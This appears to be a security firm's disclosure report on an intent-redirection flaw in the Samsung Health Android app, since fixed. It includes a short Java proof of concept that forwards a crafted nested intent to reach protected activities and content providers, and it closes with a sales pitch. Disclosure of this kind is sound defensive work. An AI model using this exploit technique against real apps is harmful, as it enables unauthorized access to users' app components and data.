# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Health</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.android.app.shealth</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.15</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.09.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$200</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

The app received a `launch_intent` from the attacking app, which was passed to `Context.startActivity()`. This led to the ability to launch arbitrary activities and gain access to content providers with the flag `android:grantUriPermissions="true"`.

**Proof of Concept**

```java
Intent next = new Intent();
next.putExtra("launch_by_sdk", true);
next.setSelector(new Intent().setClassName("com.sec.android.app.shealth", "com.samsung.android.app.shealth.home.discover.StoreWebViewActivity"));
next.putExtra("url", "http://example.com/");

Intent i = new Intent();
i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
i.setClassName("com.sec.android.app.shealth", "com.samsung.android.app.shealth.home.HomeMainActivity");
i.putExtra("launch_intent", next);
startActivity(i);
```

## References

- [Oversecured Blog. Android: Access to app protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Oversecured Blog. Gaining access to arbitrary* Content Providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.